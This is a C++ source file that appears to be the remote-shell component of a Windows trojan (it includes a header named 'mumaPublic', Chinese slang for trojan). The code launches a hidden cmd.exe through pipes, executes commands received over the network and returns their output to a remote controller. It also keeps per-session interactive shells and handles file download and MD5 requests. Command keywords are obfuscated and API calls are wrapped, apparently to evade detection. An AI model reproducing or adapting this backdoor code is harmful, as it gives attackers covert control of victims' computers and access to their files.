// Telnet.cpp: implementation of the Telnet class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include <stdio.h>
#include "Telnet.h"
#include "mumaPublic.h"
#include "WinApi.h"
#include "io.h"
#include "Struct.h"
#include "Base.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

Telnet	g_Telnet;
Telnet  g_Telnet1;
Telnet	g_Telnet2;

extern int UTF_82Unicode(char*utf8, WCHAR* wszUtf8, int len);
extern int GB23122Unicode(char*gb2312, WCHAR* wsz, int len);
extern int Unicode2UTF_8(WCHAR* wsunicode,char* buffer,int buflen);
extern int Unicode2GB2312(WCHAR* wsunicode,char* buffer,int buflen);

Telnet::Telnet()
{
	hWriteFile=NULL;
	hReadFile=NULL; 
	processinfo.dwProcessId=0;
	processinfo.dwThreadId=0;
	processinfo.hProcess=NULL;
	processinfo.hThread=NULL;
}

Telnet::~Telnet()
{

}

BOOL Telnet::init()
{
	SECURITY_ATTRIBUTES pipeattr; 

	if(hWriteFile && hReadFile)
		return TRUE;

	//创建读管道
    pipeattr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    pipeattr.lpSecurityDescriptor = NULL; 
    pipeattr.bInheritHandle = TRUE; 
    if(!PCreatePipe(&hReadPipe, &hWriteFile, &pipeattr, 0))
	{
		return FALSE;
	}


	//创建写管道
    pipeattr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    pipeattr.lpSecurityDescriptor = NULL; 
    pipeattr.bInheritHandle = TRUE; 
    if(!PCreatePipe(&hReadFile, &hWritePipe, &pipeattr, 0))
	{
		CloseHandle(hReadPipe);
		CloseHandle(hWriteFile);
		hReadPipe = NULL;
		hWriteFile = NULL;
		return FALSE;
	}

	//创建CMD进程
    STARTUPINFOA startinfo; 
	OSVERSIONINFOA osvi; 
	char szAPP[256]; 

	PGetStartupInfoA(&startinfo); 

	//设置后台进程属性
    startinfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    startinfo.hStdInput = hReadPipe; 
    startinfo.hStdError = hWritePipe; 
    startinfo.hStdOutput = hWritePipe; 
    startinfo.wShowWindow = SW_HIDE; 
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
    PGetVersionExA(&osvi); 
    PGetSystemDirectoryA(szAPP, MAX_PATH + 1); 
    if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT) 
    { 
        strcat(szAPP, "\\cmd.exe"); 
        if (PCreateProcessA(szAPP, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &startinfo, 
			&processinfo)) 
        {
			char readbuf[2000];
			DWORD nByteRead;
		
			PSleep(2000);
			memset(readbuf, 0, sizeof(readbuf));
			PReadFile(hReadFile, readbuf, 2000, &nByteRead, NULL); 
			
            return TRUE; 
        } 
    }

	CloseHandle(hReadPipe);
	CloseHandle(hWriteFile);
	hReadPipe = NULL;
	hWriteFile = NULL;
	
	CloseHandle(hWritePipe);
	CloseHandle(hReadFile);
	hWritePipe = NULL;
	hReadFile = NULL;

	return FALSE;
}

BOOL ShutProcessByID(DWORD processid)
{
	BOOL re=FALSE;
	HANDLE hProcess = POpenProcess(
		PROCESS_TERMINATE,  // want to get info
		FALSE,  // don't need to inherit this handle
		processid);  // process to open
	if(hProcess!=NULL)
	{
		re=PTerminateProcess(hProcess,-1);
		re=CloseHandle(hProcess);
	}

	return re;
}

void Telnet::reset()
{
	if(processinfo.dwProcessId>0)
	{
		ShutProcessByID(processinfo.dwProcessId);
		processinfo.dwProcessId=0;
	}

	if(hReadPipe)
	{
		CloseHandle(hReadPipe);
		hReadPipe = NULL;
	}
	if(hWriteFile)
	{
		CloseHandle(hWriteFile);
		hWriteFile = NULL;
	}
	if(hWritePipe)
	{
		CloseHandle(hWritePipe);
		hWritePipe=NULL;
	}
	if(hReadFile)
	{
		CloseHandle(hReadFile);
		hReadFile = NULL;
	}
}

char* Telnet::Excute(const char* cmd)
{
	char writebuf[1024];
	static char* readbuf = new char[60*1024];
	DWORD nByteToWrite=0;
	DWORD nByteWrite=0;
	
	DWORD nByteToRead=40*1024;
	DWORD nByteRead=0;
	DWORD nCurrentRead=0;

	if(!init())
		return "init error";

	WCHAR* unicodeCmd = new WCHAR[500];
	memset(unicodeCmd, 0, 500*sizeof(WCHAR));
	if(UTF_82Unicode((char*)cmd, unicodeCmd, 500*sizeof(WCHAR))<=0)
	{
		delete[] unicodeCmd;
		unicodeCmd = NULL;
		return "error";
	}

	char* gbcmd = new char[1000];
	memset(gbcmd, 0, 1000);
	if(Unicode2GB2312(unicodeCmd, gbcmd, 1000) <= 0)
	{
		delete[] unicodeCmd;
		delete[] gbcmd;
		return "error";
	}

	delete[] unicodeCmd;
	
	memset(writebuf, 0, sizeof(writebuf));
	nByteToWrite = _snprintf(writebuf, 1024, "%s\r\n", gbcmd);
	delete[] gbcmd;

	if(!PWriteFile(hWriteFile, writebuf, nByteToWrite, &nByteWrite, NULL))
		return "write command error";

	PSleep(200);
	memset(readbuf, 0, 60*1024);
	while(PReadFile(hReadFile, readbuf+nByteRead, nByteToRead-nByteRead, &nCurrentRead, NULL))
	{
		nByteRead += nCurrentRead;
		if(readbuf[nByteRead-1] == '>')
			break;

		if(nByteRead>7)
		{
			if(readbuf[nByteRead-2] == '?' &&
				readbuf[nByteRead-3] == ')')
				break;
		}

		if(nByteRead>=40*1024)
			break;
		
		PSleep(100);
	}

	//GB转UTF8
	WCHAR* unicoderesult = new WCHAR[nByteRead*2];
	memset(unicoderesult, 0, nByteRead*2*sizeof(WCHAR));
	if(GB23122Unicode(readbuf, unicoderesult, nByteRead*2*sizeof(WCHAR))<=0)
	{
		delete[] unicoderesult;
		return "";
	}

	memset(readbuf, 0, 60*1024);
	if(Unicode2UTF_8(unicoderesult, readbuf, 60*1024) <= 0)
	{
		delete[] unicoderesult;
		return "";
	}

	delete[] unicoderesult;
	return readbuf;
}



//上传格式：
//dealmd5: C:\calc.exe||type: (0 || 1 || 2-beg-end)||||
char* TelnetDealMD5(const char * cmd)
{
	char * inputline = new char[200];
	char * nextline = NULL;
	char * field = NULL;
	char * value = NULL;
	
	char * type = NULL;
	char * filepath = NULL;
	char * md5str = new char[33];
	memset(md5str, 0, 33);
	int re = 0;
	strcpy(inputline, cmd);
	re = LineParser2(inputline, &nextline, &field, &value);
	while(re)
	{
		if(strcmp(field, "dealmd5") == 0){
			filepath = value;
		}
		else if(strcmp(field, "type") == 0){
			type = value;
		}
		
		if(re == 2)
			break;
		inputline = nextline;
		re = LineParser2(inputline, &nextline, &field, &value);
	}
	
	WCHAR *unicodefilename = new WCHAR[500];
	memset(unicodefilename, 0, 500*sizeof(WCHAR));
	if(UTF_82Unicode((char*)filepath, unicodefilename, 500*sizeof(WCHAR))<=0)
	{
		delete[] unicodefilename;
		unicodefilename = NULL;
		return md5str;
	}

	int begpos, endpos;
	if (_waccess(unicodefilename, 0) == 0)
	{
		if (stricmp(type, "0") == 0)
		{
			MD5TranFile(md5str, unicodefilename);
		}
		else if (stricmp(type, "1") == 0)
		{
			MD5TranFile1(md5str, unicodefilename);
		}
		else if (memcmp(type, "2", 1) == 0)
		{
			sscanf(type, "2-%d-%d", &begpos, &endpos);
			MD5TranFile2(md5str, unicodefilename, begpos, endpos);
		}
	}
	
	delete []unicodefilename;
	return md5str;
}

DWORD TelnetCmd(DWORD* pPara)
{
	ThreadParam *ThreadPara = (ThreadParam*)pPara;

	char *p=strstr(ThreadPara->buf, "\r\n\r\n");
	if(p!=NULL)
		p[0]=0;
	else
	{
		return 0;
	}

	char TmpDeStr[20];
	char Type;

	p = strstr(ThreadPara->buf, DepubStringA(TmpDeStr, 20, "Gh:eBXwJ ")); //"cmdtype: "
	if (p != NULL)
	{
		Type = p[9];
	}
	else
	{
		Type = '0';
	}

	p=strstr(ThreadPara->buf, DepubStringA(TmpDeStr, 20, "GkhhVx:J "));//"command: "
	if(p!=NULL)
		p+=strlen(DepubStringA(TmpDeStr, 20, "GkhhVx:J "));
	else
	{
		return 0;
	}

	char* ret;
	if(stricmp(p, "reset")==0)
	{
		switch (Type)
		{
		case '0':
			g_Telnet.reset();
			break;
		case '1':
			g_Telnet1.reset();
			break;
		case '2':
			g_Telnet2.reset();
			break;
		}
		ret = "ok";
	}
	else if (strstr(p, "downfile") != NULL)
	{
		UpfilebytTelnet(p);
		ret = "ok";
	}
	else if (strstr(p, "dealmd5") != NULL)
	{
		ret = TelnetDealMD5(p);
	}
	else
	{
		switch (Type)
		{
		case '0':
			ret= g_Telnet.Excute(p);
			break;
		case '1':
			ret= g_Telnet1.Excute(p);
			break;
		case '2':
			ret= g_Telnet2.Excute(p);
			break;
		}
	}
	int retlen = strlen(ret);
	
	char tmphead[1024];
	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);
	int tmplen = sprintf(tmphead, "time: %04d%02d%02d%02d%02d%02d\r\n", 
		nowtime.wYear, nowtime.wMonth, nowtime.wDay,
		nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
	tmplen += sprintf(tmphead+tmplen, "content-length: %d\r\n", retlen);
	tmplen += sprintf(tmphead+tmplen, "content-type: telnet\r\n\r\n");
	
	char* pbuf = new char[tmplen+retlen+10];
	strcpy(pbuf, tmphead);
	strcat(pbuf, ret);

	if(SendData(pbuf, retlen+tmplen, ThreadPara->PacketType, ThreadPara->SessionID))
	{	
	}

	return 1;
}

//////////////////////////////////////////////////////////////////////////

SyncTelnet::SyncTelnet()
{
	hWriteFile=NULL;
	hReadFile=NULL; 
	processinfo.dwProcessId=0;
	processinfo.dwThreadId=0;
	processinfo.hProcess=NULL;
	processinfo.hThread=NULL;
}

SyncTelnet::~SyncTelnet()
{

}

void SyncTelnet::SetSessionID(string strSession)
{
	m_strSession.assign(strSession);
}

BOOL SyncTelnet::init()
{
	SECURITY_ATTRIBUTES pipeattr; 

	if(hWriteFile && hReadFile)
		return TRUE;

    pipeattr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    pipeattr.lpSecurityDescriptor = NULL; 
    pipeattr.bInheritHandle = TRUE; 
    if(!PCreatePipe(&hReadPipe, &hWriteFile, &pipeattr, 0))
	{
		return FALSE;
	}

    pipeattr.nLength = sizeof(SECURITY_ATTRIBUTES); 
    pipeattr.lpSecurityDescriptor = NULL; 
    pipeattr.bInheritHandle = TRUE; 
    if(!PCreatePipe(&hReadFile, &hWritePipe, &pipeattr, 0))
	{
		CloseHandle(hReadPipe);
		CloseHandle(hWriteFile);
		hReadPipe = NULL;
		hWriteFile = NULL;
		return FALSE;
	}

    STARTUPINFOW startinfo; 
	WCHAR szAPP[256]; 

	GetStartupInfoW(&startinfo); 

    startinfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; 
    startinfo.hStdInput = hReadPipe; 
    startinfo.hStdError = hWritePipe; 
    startinfo.hStdOutput = hWritePipe; 
    startinfo.wShowWindow = SW_HIDE; 

    GetSystemDirectoryW(szAPP, MAX_PATH + 1); 

    wcscat(szAPP, L"\\cmd.exe"); 
    if (CreateProcessW(szAPP, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &startinfo, 
		&processinfo)) 
    {
		PSleep(2000);

		HANDLE starthandle=0;
		DWORD  threadId=0;
		starthandle = CreateThread(NULL, 0, ReadCmdThread, this, 0, &threadId);
		CloseHandle(starthandle);
		
        return TRUE; 
    } 

	CloseHandle(hReadPipe);
	CloseHandle(hWriteFile);
	hReadPipe = NULL;
	hWriteFile = NULL;
	
	CloseHandle(hWritePipe);
	CloseHandle(hReadFile);
	hWritePipe = NULL;
	hReadFile = NULL;

	return FALSE;
}

void SyncTelnet::reset()
{
	DWORD nByteToWrite=6;
	DWORD nByteWrite=0;
	//OutputDebugStringA(writebuf);
	WriteFile(hWriteFile, "exit\r\n", nByteToWrite, &nByteWrite, NULL);
	
	Sleep(200);

	if(processinfo.dwProcessId>0)
	{
		ShutProcessByID(processinfo.dwProcessId);
		processinfo.dwProcessId=0;
	}

	if(hReadPipe)
	{
		CloseHandle(hReadPipe);
		hReadPipe = NULL;
	}
	if(hWriteFile)
	{
		CloseHandle(hWriteFile);
		hWriteFile = NULL;
	}
	if(hWritePipe)
	{
		CloseHandle(hWritePipe);
		hWritePipe=NULL;
	}
	if(hReadFile)
	{
		CloseHandle(hReadFile);
		hReadFile = NULL;
	}
}

void SyncTelnet::ReadCmd()
{
	char* readbuf = new char[50*1024];
	int retlen;
	DWORD nCurrentRead=0;
	
	if (hReadFile == NULL)
	{
		return ;
	}

	SYSTEMTIME nowtime;
	PGetLocalTime(&nowtime);

	memset(readbuf, 0, 50*1024);
	while(PReadFile(hReadFile, readbuf, 49*1024, &nCurrentRead, NULL))
	{
		if (nCurrentRead > 0)
		{
			//OutputDebugStringA(readbuf);
			
			//GB?UTF8
			WCHAR* unicoderesult = new WCHAR[nCurrentRead*2];
			memset(unicoderesult, 0, nCurrentRead*2*sizeof(WCHAR));
			if(GB23122Unicode(readbuf, unicoderesult, nCurrentRead*2*sizeof(WCHAR))<=0)
			{
				delete[] unicoderesult;
				continue;
			}
			
			memset(readbuf, 0, 50*1024);
			if((retlen = Unicode2UTF_8(unicoderesult, readbuf, 50*1024)) <= 0)
			{
				delete[] unicoderesult;
				continue;
			}
			
			delete[] unicoderesult;
			
			char tmphead[1024];
			int tmplen = sprintf(tmphead, "time: %04d%02d%02d%02d%02d%02d\r\n", 
				nowtime.wYear, nowtime.wMonth, nowtime.wDay,
				nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
			tmplen += sprintf(tmphead+tmplen, "sessionid: %s\r\n", m_strSession.c_str());
			tmplen += sprintf(tmphead+tmplen, "content-length: %d\r\n", retlen-1);
			tmplen += sprintf(tmphead+tmplen, "content-type: synctelnet\r\n\r\n");
			
			char* pbuf = new char[tmplen+retlen+10];
			strcpy(pbuf, tmphead);
			strcat(pbuf, readbuf);
			
			if(SendData(pbuf, retlen+tmplen-1, PTYPE_SYNCTELNET, 171))
			{	
			}

			memset(readbuf, 0, 50*1024);
		}
		
		PSleep(100);

		if (hReadFile == NULL)
		{
			break;
		}
	}

	if (readbuf)
	{
		delete []readbuf;
		readbuf = NULL;
	}
	
	return ;
}

void SyncTelnet::SyncExcute(const char* cmd)
{
	char writebuf[1024];

	DWORD nByteToWrite=0;
	DWORD nByteWrite=0;
	
	DWORD nByteToRead=40*1024;
	DWORD nByteRead=0;

	
	if(!init())
	{
		//init error
		return ;
	}
	
	WCHAR* unicodeCmd = new WCHAR[500];
	memset(unicodeCmd, 0, 500*sizeof(WCHAR));
	if(UTF_82Unicode((char*)cmd, unicodeCmd, 500*sizeof(WCHAR))<=0)
	{
		delete[] unicodeCmd;
		unicodeCmd = NULL;
		//UTF_82Unicode error
		return ;
	}
	
	char* gbcmd = new char[1000];
	memset(gbcmd, 0, 1000);
	if(Unicode2GB2312(unicodeCmd, gbcmd, 1000) <= 0)
	{
		delete[] unicodeCmd;
		delete[] gbcmd;
		//Unicode2Ansi error
		return ;
	}
	
	delete[] unicodeCmd;

	memset(writebuf, 0, sizeof(writebuf));
	nByteToWrite = _snprintf(writebuf, 1024, "%s\r\n", gbcmd);
	delete[] gbcmd;
	//OutputDebugStringA(writebuf);
	if(!PWriteFile(hWriteFile, writebuf, nByteToWrite, &nByteWrite, NULL))
	{
		//write command error
		return ;
	}
	
	return ;
}

DWORD WINAPI SyncTelnet::ReadCmdThread(LPVOID pParam)
{
	SyncTelnet *p = (SyncTelnet *)pParam;
	p->ReadCmd();
	
	return 0;
}

//////////////////////////////////////////////////////////////////////////

TelnetMap::TelnetMap()
{
	g_addallow = 0;
}

TelnetMap::~TelnetMap()
{
	
}

SyncTelnet * TelnetMap::FindTelnet(string SessionID)
{
	SyncTelnet *pCmd = NULL;
	bool flag;
	TelnetMapIterator pIter;

	getallow(g_addallow);
	
	pIter = this->find(SessionID);
	if (pIter != this->end())
	{
		pCmd = pIter->second;
		flag = true;
	}
	else
	{
		pCmd = new SyncTelnet();
		pCmd->SetSessionID(SessionID);
		this->insert(make_pair(SessionID, pCmd));
	}
	
	releaseallow(g_addallow);
	
	return pCmd;
}

bool TelnetMap::DeleteTelnet(string SessionID)
{
	SyncTelnet *pCmd = NULL;
	bool flag;
	TelnetMapIterator pIter;

	getallow(g_addallow);

	pIter = this->find(SessionID);
	if (pIter != this->end())
	{
		pCmd = pIter->second;
		pCmd->reset();
		flag = true;
	}
	else
	{
		flag = false;
	}

	releaseallow(g_addallow);

	return flag;
}

BOOL TelnetMap::getallow(long &hashallow)
{
	int wait = 0xFFFF;
	int h = wait;
	do
	{
		if (0 == InterlockedExchange(&hashallow, 0xcc))
		{
			return TRUE;
		}
		::Sleep(20);
		wait -= 20;
		if (h-wait > 5000)
		{
			InterlockedExchange(&hashallow, 0);
			h = wait;
		}
	} while(wait > 0);
	
	return FALSE;
}

BOOL TelnetMap::releaseallow(long &hashallow)
{	
	InterlockedExchange(&hashallow, 0);
	return TRUE;
}

TelnetMap g_TelnetMap;

//////////////////////////////////////////////////////////////////////////

DWORD SyncTelnetCmd(DWORD* pPara)
{
	ThreadParam *ThreadPara = (ThreadParam*)pPara;
	
	DWORD datalen=0;
	char* strSession = NULL;
	char* strCommand = NULL;
	char *inputline	=ThreadPara->buf;
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	//初始化
	int re=0;
	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(stricmp(field, "session")==0) //session
		{
			strSession = value;
		}
		else if(stricmp(field, "command")==0) //command
		{
			strCommand = value;
		}
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}	
	if(strSession == NULL || strCommand == NULL)
		return FALSE;
	
	SyncTelnet *oneCmd = g_TelnetMap.FindTelnet(strSession);

	if(stricmp(strCommand, "reset")==0)
	{
		oneCmd->reset();
		Sleep(1000);
		oneCmd->SyncExcute("cd");
	}
// 	else if(stricmp(strCommand, "control-c")==0)
// 	{
// 		oneCmd->SyncExcute("control-c");
// 	}
	else if(stricmp(strCommand, "exit")==0)
	{
		g_TelnetMap.DeleteTelnet(strSession);
	}
	else
	{
		oneCmd->SyncExcute(strCommand);
	}

	return 1;
}